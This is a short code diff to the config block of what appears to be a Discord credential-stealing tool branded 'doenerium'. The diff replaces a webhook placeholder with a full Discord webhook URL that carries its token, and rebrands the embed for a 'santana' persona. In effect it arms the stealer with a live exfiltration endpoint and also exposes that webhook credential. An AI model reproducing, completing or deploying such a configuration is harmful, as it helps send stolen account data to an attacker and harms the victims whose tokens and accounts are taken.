@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "https://canary.discord.com/api/webhooks/1040403397389594664/7rx3VtVAZIynljbKChrx54WTBIXaAz_HNLm4LDoVam1GbkwuVPFyQR-zWlH1HvxiOMXs",
 
     logout: false,
     disable_qr_code: false,
@@ -28,7 +28,7 @@ var config = {
             text: `santana`,
             icon_url: "https://cdn.discordapp.com/attachments/1035507488142925834/1035507658280669224/santana.gif",
         },
-        href: "https://discord.gg/turk",
+        href: "santana#8888",
         avatar_url: "https://cdn.discordapp.com/attachments/1035507488142925834/1035507658280669224/santana.gif"
     },
 
